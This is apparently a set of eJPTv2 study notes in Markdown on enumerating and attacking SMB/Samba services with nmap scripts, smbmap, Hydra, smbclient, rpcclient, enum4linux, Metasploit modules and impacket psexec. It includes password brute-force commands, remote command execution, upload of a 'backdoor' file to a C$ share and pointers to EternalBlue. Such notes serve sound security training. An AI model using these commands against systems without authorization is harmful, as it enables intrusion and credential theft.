# Nmap

- `nmap -sU --top-ports 25` : port 137, 138 are udp smb ports. check if open.

## Nmap enum scripts

- `nmap -sU --top-ports 25 <ip>`
    
    [![SMB UDP ports](https://github.com/neilmadhava/EJPTv2-Notes/raw/main/Information%20Gathering%20and%20Enumeration/images/nmap-01.png)](https://github.com/neilmadhava/EJPTv2-Notes/blob/main/Information%20Gathering%20and%20Enumeration/images/nmap-01.png)
    
- smb-protocols : list supported protocols
    
    - if v1 is enabled - EternalBlue exploit?
- smb-security-mode : guest account enabled?
    
- smb-os-discovery.nse : NetBIOS computer name and OS
    
- smb-enum-sessions : enum logged in users
    
- smb-enum-sessions --script-args smbusername=,smbpassword=
    
- smb-enum-users.nse : list all users that exist on samba version
    
    [![smb-enum-users.nse output](https://github.com/neilmadhava/EJPTv2-Notes/raw/main/Information%20Gathering%20and%20Enumeration/images/nmap-02-enumusers.png)](https://github.com/neilmadhava/EJPTv2-Notes/blob/main/Information%20Gathering%20and%20Enumeration/images/nmap-02-enumusers.png)
    
- smb-enum-shares : enum shares as guest
    
- smb-enum-shares,smb-ls --script-args smbusername=,smbpassword= : Enumerating all the shared folders and drives then running the ls command on all the shared folders.
    
- smb-enum-shares --script-args smbusername=,smbpassword=
    
    - if IPC$ share had RW perms - lets anon users enum shares, accounts etc
- smb-enum-users --script-args smbusername=,smbpassword=: enum user acc on target sys
    
- smb-server-stats --script-args smbusername=,smbpassword=
    
- smb-enum-domains --script-args smbusername=,smbpassword=
    
- smb-enum-groups --script-args smbusername=,smbpassword=
    
- smb-enum-services --script-args smbusername=,smbpassword=

- smb-brute --script-args smbuser=path/to/usernames.txt,smbpass=path/to/passwords.txt -p 445 <target_ip>

# SMBMAP

- Allows users to enumerate samba share
    
- Allows file upload/download/delete
    
- Permission enumeration (writable share, meet Metasploit)
    
- `smbmap -H <ip> -u guest -p "" -d <domain>`
    
    [![smbmap output](https://github.com/neilmadhava/EJPTv2-Notes/raw/main/Information%20Gathering%20and%20Enumeration/images/smbmap-01.png)](https://github.com/neilmadhava/EJPTv2-Notes/blob/main/Information%20Gathering%20and%20Enumeration/images/smbmap-01.png)
    
- `smbmap -H <ip> -u guest -p "" -d .`
    
- `smbmap -H <ip> -u <user> -p <pass> -x 'ipconfig'` : execute command on remote host
    
- `smbmap -H <ip> -u <user> -p <pass> -L` : list all drives (C: or D:)
    
    [![smbmap list drives output](https://github.com/neilmadhava/EJPTv2-Notes/raw/main/Information%20Gathering%20and%20Enumeration/images/smbmap-02.png)](https://github.com/neilmadhava/EJPTv2-Notes/blob/main/Information%20Gathering%20and%20Enumeration/images/smbmap-02.png) ￼
    
- `smbmap -H <ip> -u <user> -p <pass> -r 'C$'` : list contents of C:\
    
    [![smbmap list contents of drive](https://github.com/neilmadhava/EJPTv2-Notes/raw/main/Information%20Gathering%20and%20Enumeration/images/smbmap-03.png)](https://github.com/neilmadhava/EJPTv2-Notes/blob/main/Information%20Gathering%20and%20Enumeration/images/smbmap-03.png)
    
- `smbmap -H <ip> -u <user> -p <pass> --upload '/root/backdoor' 'C$\backdoor'`
    
    [![smbmap upload backdoor output](https://github.com/neilmadhava/EJPTv2-Notes/raw/main/Information%20Gathering%20and%20Enumeration/images/smbmap-04.png)](https://github.com/neilmadhava/EJPTv2-Notes/blob/main/Information%20Gathering%20and%20Enumeration/images/smbmap-04.png)
    
- `smbmap -H <ip> -u <user> -p <pass> --download 'C$\flag.txt'`
    
    [![smbmap download flag output](https://github.com/neilmadhava/EJPTv2-Notes/raw/main/Information%20Gathering%20and%20Enumeration/images/smbmap-05.png)](https://github.com/neilmadhava/EJPTv2-Notes/blob/main/Information%20Gathering%20and%20Enumeration/images/smbmap-05.png)
    

# Metasploit Modules

- auxiliary/scanner/smb/smb_version - exact version of smb
- auxiliary/scanner/smb/smb2 - smb2 protocol supported?
- auxiliary/scanner/smb/smb_enumusers
- auxiliary/scanner/smb/smb_enumshares
- auxiliary/scanner/smb/pipe_auditor : determine what named pipes are accessible over SMB (req creds)
- auxiliary/scanner/smb/smb_login
- auxiliary/scanner/smb/smb_ms17_010 - eternalblue vuln tester
- exploit/windows/smb/psexec

# Hydra

- `hydra -l <user> -P <pass_wordlist> 192.212.251.3 smb`
- hydra -l student -P /usr/share/merasploit-framework/data/wordlists/unix_passwords.txt 10.10.10.10 smb
- bruteforce smb --> nmap --script smb-brute --script-args smbuser=path/to/usernames.txt,smbpass=path/to/passwords.txt -p 445 <target_ip>

# Nmblookup

- `nmblookup -A <ip>`
    
    [![nmblookup output](https://github.com/neilmadhava/EJPTv2-Notes/raw/main/Information%20Gathering%20and%20Enumeration/images/nmblookup-01.png)](https://github.com/neilmadhava/EJPTv2-Notes/blob/main/Information%20Gathering%20and%20Enumeration/images/nmblookup-01.png) ￼
    

# SMBclient

- `smbclient -L <ip> -N` : list sharenames and domains with no pass with anonymous connection.
- `smbclient -L <ip> -U <user>` : authenticate as a user with legit creds
- `smbclient //<ip>/public -N`
- `smbclient //<ip>/public -U <user>`
- smbclient //192.168.1.100/shared_folder -U guest
    - smb> ls
    - smb> get flag

# RPCclient

- `rpcclient -U "" -N <ip>` : check anonymous login allowed - if no errors
- rpcclient $>
    - srvinfo : os version of samba server
    - enumdomgroups : enum domain groups
    - enumdomusers : enum domain users
    - lookupnames admin : get SID of user "admin"

# Enum4linux

- `enum4linux -o <ip>` : get os version
    
- `enum4linux -U <ip>` : enum users (use -u -p for auth enum)
    
- `enum4linux -S <ip>` : enum shares
    
- `enum4linux -G <ip>` : enum domain groups
    
- `enum4linux -i <ip>` : get printer info'
    
    [![enum4linux printer output](https://github.com/neilmadhava/EJPTv2-Notes/raw/main/Information%20Gathering%20and%20Enumeration/images/enum4linux-01.png)](https://github.com/neilmadhava/EJPTv2-Notes/blob/main/Information%20Gathering%20and%20Enumeration/images/enum4linux-01.png)
    
- `enum4linux -r -u "admin" -p "password" <ip>` : enum users via RID cycling. S-1-22-1-1003 etc.
    

# PSExec (Authenticated)

- cp /usr/share/doc/python3-impacket/examples/psexec.py /root/Desktop
- chmod +x psexec.py
- python3 psexec.py Administrator@ip
- this will provide remote session

# References

1. Samba ([https://www.samba.org/](https://www.samba.org/))
2. smbclient ([https://www.samba.org/samba/docs/current/man-html/smbclient.1.html](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html))
3. rpcclient ([https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html))
4. nmblookup ([https://www.samba.org/samba/docs/current/man-html/nmblookup.1.html](https://www.samba.org/samba/docs/current/man-html/nmblookup.1.html))
5. enum4Linux ([https://tools.kali.org/information-gathering/enum4linux](https://tools.kali.org/information-gathering/enum4linux))
6. THC Hydra ([https://tools.kali.org/password-attacks/hydra](https://tools.kali.org/password-attacks/hydra))
7. smbmap ([https://tools.kali.org/information-gathering/smbmap](https://tools.kali.org/information-gathering/smbmap))
8. Metasploit Module: SMB Session Pipe Auditor ([https://www.rapid7.com/db/modules/auxiliary/scanner/smb/pipe_auditor](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/pipe_auditor))